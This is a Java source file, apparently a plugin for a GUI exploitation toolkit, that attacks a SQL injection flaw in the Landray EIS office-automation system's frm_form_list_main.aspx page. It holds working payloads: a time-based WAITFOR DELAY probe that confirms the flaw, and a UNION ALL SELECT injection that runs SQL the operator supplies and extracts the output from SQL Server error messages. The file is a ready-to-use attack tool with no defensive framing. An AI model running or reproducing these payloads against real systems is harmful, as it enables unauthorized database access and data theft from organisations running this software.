package exp.oa.landrayoa;

import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class landray_eis_FrmFormListMain_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String error_sqli_get(String url){
        try {
            // 打开连接
            HttpURLConnection connection = HttpTools.getCoon(url);
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 读取响应内容
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
            } else {
                // 读取错误信息
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String errorLine;
                StringBuilder errorResponse = new StringBuilder();
                while ((errorLine = errorReader.readLine()) != null) {
                    errorResponse.append(errorLine);
                }
                errorReader.close();
                return errorResponse.toString();
            }
            connection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            long var = HttpTools_getTime.get(url + "/frm/frm_form_list_main.aspx?list_id=1%3BWAITFOR%20DELAY%20'0%3A0%3A3'%20--%20SxwK", head, "utf-8");
            if (var>3000) {
                String target_req = url + "/frm/frm_form_list_main.aspx?list_id=1%3BWAITFOR%20DELAY%20'0%3A0%3A3'%20--%20SxwK";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_eis_FrmFormListMain_sqli ]");
                    textArea.appendText("\n (1) 延时注入,sql: sqlserver");
                    textArea.appendText("\n (2) 联合查询注入, CMD输入sql语句, eg: user_name()");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            String var =  error_sqli_get(url+"/frm/frm_form_list_main.aspx?list_id=1%20UNION%20ALL%20SELECT%20NULL%2C"+ getAllEncode.getAllUrlEncode(sql,"")+"%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20SxwK");

            if (var!=null && var.contains("nvarchar")) {
                String var1 = getIndexOf.getMessage(var, "char 值 '", 8, "' 转换成数据类型 int 时失败", 0);
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入成功");
                    textArea_cmd.appendText("\n" + var1);
                    textArea.appendText("\n ");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : " + sql + "注入失败");
                    textArea.appendText("\n ");
                });
                return false;
            }
        }catch (Exception E){
            return false;
        }
    }
}
